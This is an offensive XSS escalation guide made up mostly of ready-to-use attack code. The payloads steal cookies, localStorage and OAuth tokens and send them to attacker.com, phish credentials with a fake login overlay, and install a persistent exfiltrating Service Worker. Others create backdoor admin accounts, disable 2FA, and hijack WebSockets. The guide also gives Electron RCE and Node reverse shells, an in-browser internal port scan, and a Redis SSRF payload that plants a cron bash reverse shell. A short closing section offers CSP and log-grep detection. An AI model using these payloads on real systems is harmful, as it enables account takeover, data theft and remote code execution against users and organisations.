# XSS to RCE Escalation Guide

> Techniques for escalating Cross-Site Scripting from simple alert boxes to full account takeover, persistent backdoors via Service Workers, and Remote Code Execution through chained vulnerabilities.

## 1. Session Hijacking and Account Takeover

The most direct escalation path: steal session tokens and impersonate the victim.

```javascript
// Exfiltrate cookies (when HttpOnly is not set)
<script>
fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie));
</script>

// Steal tokens from localStorage/sessionStorage
<script>
const tokens = {
  access: localStorage.getItem('access_token'),
  refresh: localStorage.getItem('refresh_token'),
  session: sessionStorage.getItem('session_id')
};
navigator.sendBeacon('https://attacker.com/collect', JSON.stringify(tokens));
</script>

// Capture credentials via fake login overlay
<script>
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;
              background:#fff;z-index:99999;display:flex;
              align-items:center;justify-content:center;">
    <form action="https://attacker.com/phish" method="POST">
      <h2>Session Expired - Please Re-authenticate</h2>
      <input name="email" type="email" placeholder="Email"><br>
      <input name="password" type="password" placeholder="Password"><br>
      <button type="submit">Login</button>
    </form>
  </div>`;
</script>
```

## 2. Service Worker Persistence

Register a malicious Service Worker to maintain persistent access even after the XSS is patched.

```javascript
// Step 1: Host malicious service worker on same origin
// Requires finding an upload endpoint or path traversal
// sw.js content (hosted at /uploads/sw.js):
self.addEventListener('fetch', function(event) {
  // Intercept all requests
  if (event.request.url.includes('/api/')) {
    // Clone and exfiltrate API responses
    event.respondWith(
      fetch(event.request).then(function(response) {
        const clone = response.clone();
        clone.text().then(function(body) {
          fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify({
              url: event.request.url,
              data: body
            })
          });
        });
        return response;
      })
    );
  }
});

// Step 2: Register via XSS payload
<script>
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/uploads/sw.js', {
    scope: '/'
  }).then(function(reg) {
    console.log('Persistent backdoor installed');
  });
}
</script>
```

## 3. CSRF to Admin Actions

Use XSS to perform privileged actions as the victim without needing their credentials.

```javascript
// Create admin account via XSS
<script>
fetch('/admin/users/create', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': document.querySelector('meta[name=csrf-token]').content
  },
  credentials: 'include',
  body: JSON.stringify({
    username: 'backdoor_admin',
    password: 'P@ssw0rd123!',
    role: 'administrator',
    email: 'attacker@evil.com'
  })
});
</script>

// Modify application settings (disable security features)
<script>
fetch('/api/settings', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({
    two_factor_auth: false,
    ip_whitelist: [],
    session_timeout: 999999,
    allow_api_key_creation: true
  })
});
</script>
```

## 4. XSS to RCE via Electron Apps

Desktop applications built with Electron often have Node.js integration enabled.

```javascript
// If nodeIntegration is enabled (common in older Electron apps)
<script>
const { exec } = require('child_process');
exec('id && cat /etc/passwd', function(err, stdout) {
  fetch('https://attacker.com/rce', {
    method: 'POST',
    body: stdout
  });
});
</script>

// If contextIsolation is disabled, access via preload bridge
<script>
// Access exposed Node APIs through window object
if (window.electronAPI) {
  window.electronAPI.executeCommand('whoami');
}
// Or exploit prototype pollution to escape sandbox
</script>

// Reverse shell via Electron XSS
<script>
const net = require('net');
const { spawn } = require('child_process');
const client = new net.Socket();
client.connect(4444, 'attacker.com', function() {
  const sh = spawn('/bin/bash', []);
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});
</script>
```

## 5. OAuth Token Theft and API Abuse

```javascript
// Steal OAuth tokens and use them for API access
<script>
// Extract token from URL fragment (implicit flow)
const hash = new URLSearchParams(window.location.hash.substring(1));
const accessToken = hash.get('access_token');

// Or intercept OAuth callback
const originalAssign = location.assign;
location.assign = function(url) {
  if (url.includes('access_token') || url.includes('code=')) {
    fetch('https://attacker.com/oauth-steal?url=' + encodeURIComponent(url));
  }
  return originalAssign.call(this, url);
};

// Use stolen token to access APIs
fetch('https://api.target.com/v1/users/me', {
  headers: {'Authorization': 'Bearer ' + accessToken}
}).then(r => r.json()).then(data => {
  fetch('https://attacker.com/data', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

## 6. WebSocket Hijacking

```javascript
// Intercept and inject into WebSocket connections
<script>
const OrigWebSocket = window.WebSocket;
window.WebSocket = function(url, protocols) {
  const ws = new OrigWebSocket(url, protocols);

  ws.addEventListener('message', function(event) {
    // Exfiltrate all messages
    fetch('https://attacker.com/ws-data', {
      method: 'POST',
      body: event.data
    });
  });

  // Inject malicious commands after connection
  const origSend = ws.send.bind(ws);
  ws.send = function(data) {
    // Inject admin commands
    origSend(JSON.stringify({
      action: 'elevate_privileges',
      target_user: 'attacker@evil.com',
      role: 'admin'
    }));
    return origSend(data);
  };

  return ws;
};
</script>
```

## 7. Chaining XSS with Server-Side Vulnerabilities

```bash
# Step 1: Use XSS to discover internal endpoints
# Payload that scans internal network from victim's browser:
<script>
const internalHosts = ['10.0.0.1', '192.168.1.1', '172.16.0.1'];
const ports = [80, 443, 8080, 8443, 9200, 6379, 27017];

internalHosts.forEach(host => {
  ports.forEach(port => {
    fetch(`http://${host}:${port}/`).then(r => r.text()).then(body => {
      fetch('https://attacker.com/internal-scan', {
        method: 'POST',
        body: JSON.stringify({host, port, body: body.substring(0, 500)})
      });
    }).catch(() => {});
  });
});
</script>
```

```python
# Step 2: Use discovered SSRF endpoint via XSS
# If admin panel has an SSRF-vulnerable feature:
import requests

# Use stolen admin session to trigger SSRF -> RCE
session = requests.Session()
session.cookies.set('session', 'stolen_admin_session_token')

# Exploit internal service (e.g., Redis) via SSRF
payload = "http://internal-redis:6379/\r\nSET shell '*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1'\r\nCONFIG SET dir /var/spool/cron/\r\nCONFIG SET dbfilename root\r\nSAVE\r\n"

session.post('https://target.com/admin/fetch-url', data={'url': payload})
```

## 8. Detection and Prevention

```bash
# Monitor for Service Worker registrations
# CSP header to restrict Service Worker scope:
Content-Security-Policy: worker-src 'self';

# Detect XSS-to-ATO attempts in server logs:
grep -E "(serviceWorker\.register|navigator\.sendBeacon|fetch.*attacker)" \
  /var/log/nginx/access.log

# Implement Subresource Integrity for critical scripts:
<script src="/js/app.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous"></script>
```
